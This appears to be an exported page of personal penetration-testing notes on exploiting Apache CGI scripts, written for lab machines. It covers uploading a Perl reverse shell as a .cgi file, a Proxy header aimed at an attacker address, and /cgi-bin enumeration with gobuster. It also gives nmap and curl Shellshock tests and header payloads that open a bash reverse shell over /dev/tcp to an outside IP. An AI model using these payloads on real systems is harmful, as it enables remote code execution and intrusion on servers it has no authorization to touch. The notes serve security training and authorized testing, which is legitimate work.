<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>CGI Scripts</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># CGI Scripts</h1></strong><br />If you find a <code>/cgi-bin</code> directory on an Apache site, then the <code>mod_cgi</code> module is most likely installed.<br /><br />• <a href="https://httpd.apache.org/docs/current/mod/mod_cgi.html">https://httpd.apache.org/docs/current/mod/mod_cgi.html</a><br />• <a href="http://docs.1h.com/Mod_cgi">http://docs.1h.com/Mod_cgi</a><br />• <a href="https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/">https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/</a><br />• <a href="https://www.hellboundhackers.org/articles/read-article.php?article_id=7">https://www.hellboundhackers.org/articles/read-article.php?article_id=7</a><br /><br /><strong><h2>## About CGI</h2></strong><br />CGI stands for Common Gateway Interface.<br />CGI is a protocol designed to allow web servers (e.g. Apache) to run scripts (system commands, php code, python code etc.) on the server, and return the output to the client via HTTP.<br />It&#39;s normally used to generate dynamic content on websites, but is also used by admins for logging etc.<br /><br />• <code>mod_cgi</code> is the Apache plugin.<br />• <code>/cgi-bin</code> is a diretory where the scripts can be stored.<br />   ◇ CGI will run all kinds of scripts - shell, perl, php, python etc.<br /><br /><strong><h2>## Exploiting CGI</h2></strong><br /><strong><h3>### Upload a Reverse Shell</h3></strong><br />Try uploading a reverse shell as a <code>.cgi</code> file, and then execute the shell by browsing to it.<br />The <code>.cgi</code> file will hopefully execute, and you&#39;ll get a reverse shell.<br /><br />For example:<br />• Rename <code>/usr/share/webshells/perl/perl-reverse-shell.pl</code> to <code>perl.cgi</code><br />• Upload <code>perl.cgi</code><br />• Access the uploaded <code>perl.cgi</code> on the website to trigger the CGI script to run<br /><br /><strong><h3>### Proxy/MITM Web Requests</h3></strong><br />Try sending a <code>Proxy</code> header:<br /><code>Proxy: &lt;attacker_ip&gt;:&lt;attacker port&gt;</code><br />If the server performs a request, you can capture requests made by the server.<br /><br /><strong><h3>### Shellshock</h3></strong><br />The <code>mod_cgi</code> Apache plugin runs CGI scripts.<br /><br />If you append code to the end of a HTTP Header (which count as environment variables) when requesting a CGI script, the appended code will run if the target machine is vulnerable to Shellshock.<br /><br /><strong>Examples</strong><br />• oscp 10.11.1.71 - Alpha<br /><br /><strong>#### Finding CGI scripts</strong><br />Search for files ending with common script extensions in /cgi-bin<br /><code>root@gotham:~/ctf/shocker/80http# gobuster -e -u </code><a href="http://10.10.10.56/cgi-bin/">http://10.10.10.56/cgi-bin/</a><code> -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gb-big-cgi_bin -x .sh,.php,.py,.pl,.cgi,.exe</code><br /><br />Good wordlists in <code>seclists</code> for this:<br />• CGIs.txt - mainly this one    <br />• CGI-HTTP-POST.fuzz.txt<br />• CGI-HTTP-POST-Windows.fuzz.txt<br />• CGI-Microsoft.fuzz.txt<br />• CGI-XPlatform.fuzz.txt <br /><br /><strong>#### Testing</strong><br />Nmap<br /><div class="codebox"><div class="codebox">nmap&nbsp;10.2.1.31&nbsp;-p&nbsp;80&nbsp;--script=http-shellshock&nbsp;--script-args&nbsp;uri=/cgi-bin/admin.cgi</div></div><br /><br />Curl<br /><div class="codebox"><div class="codebox">curl&nbsp;-H&nbsp;&#39;User-Agent:&nbsp;()&nbsp;{&nbsp;:;&nbsp;};&nbsp;echo&nbsp;&quot;VULNERABLE&nbsp;TO&nbsp;SHELLSHOCK&quot;&#39;&nbsp;http://10.1.2.32/cgi-bin/admin.cgi&nbsp;|&nbsp;grep&nbsp;&#39;VULNERABLE&#39;<br />#&nbsp;Blind&nbsp;test&nbsp;(wait&nbsp;5&nbsp;seconds&nbsp;for&nbsp;response)<br />curl&nbsp;-H&nbsp;&#39;User-Agent:&nbsp;()&nbsp;{&nbsp;:;&nbsp;};&nbsp;/bin/bash&nbsp;-c&nbsp;&quot;sleep&nbsp;5&quot;&#39;&nbsp;http://10.11.2.12/cgi-bin/admin.cgi</div></div><br /><br /><strong>#### Exploiting</strong><br />• Metasploit module - <code>apache_mod_cgi_bash_env_exec</code><br />• Exploitdb code (really great/easy) - <a href="https://www.exploit-db.com/exploits/34900">https://www.exploit-db.com/exploits/34900</a><br />• Shellshocker - <a href="https://github.com/liamim/shellshocker">https://github.com/liamim/shellshocker</a><br /><br /><strong>Manually</strong><br />Modify any of the HTTP headers (Nmap uses User-Agent) to:<br /><code>() { :; }; &lt;command&gt;</code><br />e.g. <br /><code>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1</code><br /><br />Some web servers won&#39;t return an output,<br />so you can blindly test for Apache Shellshock code execution with <code>sleep</code><br /><code>() { :; }; sleep 10</code><br /><br />If the web server sleeps for 10 seconds, you most likely have code execution.<br /><br />You can even create your own header, and code execution will (might) work:<br /><code>Test: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1</code><br /></div>
</body>
</html>
